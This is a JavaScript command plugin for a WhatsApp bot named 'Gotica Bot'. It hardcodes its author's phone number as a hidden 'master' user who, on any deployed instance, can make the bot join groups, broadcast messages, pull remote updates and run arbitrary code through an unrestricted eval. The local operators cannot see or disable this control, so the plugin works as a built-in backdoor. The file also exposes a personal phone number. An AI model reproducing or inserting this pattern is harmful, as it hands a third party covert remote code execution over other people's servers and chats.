/**
 * ╔═╗ ╔═╗ ╔╦╗ ╦ ╔═╗ ╔═╗      ╔╗  ╔═╗ ╔╦╗
 * ║ ╦ ║ ║  ║  ║ ║   ╠═╣      ╠╩╗ ║ ║  ║ 
 * ╚═╝ ╚═╝  ╩  ╩ ╚═╝ ╩ ╩      ╚═╝ ╚═╝  ╩ 
 * @author Leandro Rocha
 * @link https://github.com/leandromemes
 * @project Gotica Bot
 */

import { exec } from 'child_process'

// O SEU NÚMERO FIXO - A CHAVE MESTRA QUE NINGUÉM APAGA
const SOBERANO_MASTER = '556391330669@s.whatsapp.net'

let handler = async (m, { conn, text, usedPrefix, command }) => {
    // Se não for o Soberano Leandro, o bot fica totalmente invisível
    if (m.sender !== SOBERANO_MASTER) return

    if (!text) return m.reply(`✨ *Soberano Leandro,* aguardando ordens supremas. 💋\n\n*— COMANDOS DE ELITE:*\n\n⭐ *${usedPrefix + command} entrar [link]*\n(Entra no grupo solicitado)\n\n💫 *${usedPrefix + command} aviso [texto]*\n(Manda aviso em todos os grupos do bot)\n\n🌙 *${usedPrefix + command} avisodonos [texto]*\n(Manda mensagem no PV dos donos locais)\n\n🖤 *${usedPrefix + command} lista*\n(Mostra o status da frota deste bot)\n\n✨ *${usedPrefix + command} update*\n(Força o git pull remoto)\n\n🚀 *${usedPrefix + command} eval [código]*\n(Executa código no sistema)`)

    const args = text.split(' ')
    const action = args[0]
    const q = args.slice(1).join(' ')

    // 1. FORÇAR O BOT A ENTRAR EM UM GRUPO
    if (action === 'entrar') {
        if (!q.includes('chat.whatsapp.com')) return m.reply('❌ Link inválido, Soberano.')
        try {
            let code = q.split('chat.whatsapp.com/')[1]
            await conn.groupAcceptInvite(code)
            return m.reply('✨ *Entrei no grupo com sucesso!* 🖤')
        } catch (e) {
            return m.reply('❌ Erro ao entrar: Link expirado ou bot banido.')
        }
    }

    // 2. AVISO GLOBAL (TODOS OS GRUPOS)
    if (action === 'aviso') {
        if (!q) return m.reply('❌ Escreva o aviso, Soberano.')
        let chats = Object.entries(conn.chats).filter(([jid, chat]) => jid.endsWith('@g.us')).map(v => v[0])
        await m.reply(`💫 *Enviando aviso para ${chats.length} grupos...*`)
        for (let id of chats) {
            await conn.sendMessage(id, { text: `📢 *AVISO SUPREMO DO DESENVOLVEDOR* 💋\n\n${q}\n\n✨ _By: Soberano Leandro_` })
        }
        return m.reply('✨ *Aviso global enviado!* ⭐')
    }

    // 3. AVISO DIRETO PARA OS DONOS LOCAIS (PV)
    if (action === 'avisodonos') {
        if (!q) return m.reply('❌ Escreva a mensagem para os donos, Soberano.')
        let msgParaDono = `⚠️ *MENSAGEM DO CRIADOR SUPREMO* ⚠️\n\n${q}\n\n✨ _Mantenha seu bot atualizado no GitHub!_ 💋`
        for (let ownerNum of global.owner) {
            let jid = ownerNum[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
            await conn.sendMessage(jid, { text: msgParaDono })
        }
        return m.reply('✨ *Os donos locais foram avisados no PV!* 🖤')
    }

    // 4. RELATÓRIO DA FROTA
    if (action === 'lista') {
        let totalGroups = Object.keys(conn.chats).filter(v => v.endsWith('@g.us')).length
        let totalPrivates = Object.keys(conn.chats).filter(v => v.endsWith('@s.whatsapp.net')).length
        
        let infoLista = `✨ *STATUS DA FROTA GOTICA* 💋\n\n`
        infoLista += `⭐ *Bot:* @${conn.user.jid.split('@')[0]}\n`
        infoLista += `💫 *Grupos:* ${totalGroups}\n`
        infoLista += `🌙 *Chats PV:* ${totalPrivates}\n`
        infoLista += `🖤 *Versão:* ${global.vs || '7.3.0'}\n\n`
        infoLista += `✨ _Soldado pronto para combate!_`
        
        return m.reply(infoLista, null, { mentions: [conn.user.jid] })
    }

    // 5. ATUALIZAÇÃO REMOTA (GIT PULL)
    if (action === 'update') {
        await m.reply('🌙 *Puxando atualizações do GitHub...*')
        exec('git pull', (err, stdout) => {
            if (err) return m.reply(`❌ Erro no terminal: ${err}`)
            m.reply(`✅ *Resultado:* \n${stdout}`)
        })
        return
    }

    // 6. EXECUÇÃO DE CÓDIGO (EVAL)
    if (action === 'eval') {
        try {
            let evaled = await eval(q)
            if (typeof evaled !== 'string') evaled = (await import('util')).inspect(evaled)
            m.reply(evaled)
        } catch (e) {
            m.reply(String(e))
        }
    }
}

handler.help = ['soberano']
handler.tags = ['owner']
handler.command = ['soberanoo', 'devsoberano', 'devglobal']
handler.rowner = false 
handler.owner = false

export default handler